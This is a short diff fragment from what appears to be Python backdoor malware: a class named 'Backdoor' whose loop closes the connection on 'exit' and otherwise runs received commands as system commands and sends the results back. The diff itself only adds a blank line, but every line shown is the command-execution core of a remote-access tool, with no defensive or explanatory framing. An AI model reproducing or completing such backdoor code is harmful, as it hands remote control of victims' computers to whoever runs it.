@@ -30,6 +30,7 @@ class Backdoor:
             if command[0] == "exit":
                 self.connection.close()
                 exit()
+
             command_result = self.execute_system_command(command)
             self.reliable_send(command_result)
 
